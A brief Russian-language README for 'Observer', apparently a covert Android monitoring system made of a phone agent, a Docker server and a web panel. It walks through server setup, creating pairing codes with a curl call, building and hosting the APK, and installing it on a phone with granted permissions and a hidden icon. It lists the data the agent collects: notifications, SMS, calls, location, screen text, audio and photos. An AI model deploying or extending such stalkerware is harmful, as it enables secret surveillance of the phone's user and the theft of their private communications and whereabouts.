# Observer

Агент Android + сервер + веб-панель.

## 1. Сервер
    cd server
    cp .env.example .env
    bash scripts/init.sh
    nano .env            # вписать DOMAIN
    mkdir -p dist
    docker compose up -d --build

Панель: https://ДОМЕН/panel — пароль из .env (ADMIN_PASSWORD)

## 2. Код привязки
    curl -X POST -H "X-Admin-Token: ПАРОЛЬ" https://ДОМЕН/api/codes

## 3. APK
    cd android
    Android Studio -> Open -> Build APK(s)

APK положить в server/dist/app.apk, ссылка https://ДОМЕН/app/app.apk

## 4. Установка
Открыть APK, ввести адрес сервера и код, выдать разрешения, «Скрыть иконку».

## Что собирается
Уведомления, SMS, вызовы, геолокация, текст экрана, звук, фото.
